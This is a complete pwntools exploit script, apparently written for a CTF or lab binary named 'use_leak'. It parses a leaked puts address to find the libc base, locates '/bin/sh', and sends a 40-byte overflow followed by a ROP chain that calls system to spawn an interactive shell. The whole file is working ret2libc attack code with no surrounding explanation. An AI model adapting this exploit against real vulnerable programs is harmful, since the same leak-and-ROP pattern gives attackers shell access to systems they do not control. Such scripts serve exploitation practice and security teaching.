#!/usr/bin/python
from pwn import *
context.arch = "amd64"

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process("./use_leak")

p.readuntil("yours? ")
puts_leak = int(p.readline(), 16)
libc.address = puts_leak - libc.symbols["puts"]
bin_sh_addr = libc.search("/bin/sh").next()

log.info("leaked puts address: 0x{:>8x}".format(puts_leak))
log.info("found libc base address: 0x{:>8x}".format(libc.address))
log.info("found system address: 0x{:>8x}".format(libc.symbols["system"]))
log.info("found /bin/sh address: 0x{:>8x}".format(bin_sh_addr))

rop = ROP(libc)
rop.system(bin_sh_addr)
p.sendline("A" * 40 + rop.chain()) 
p.interactive()
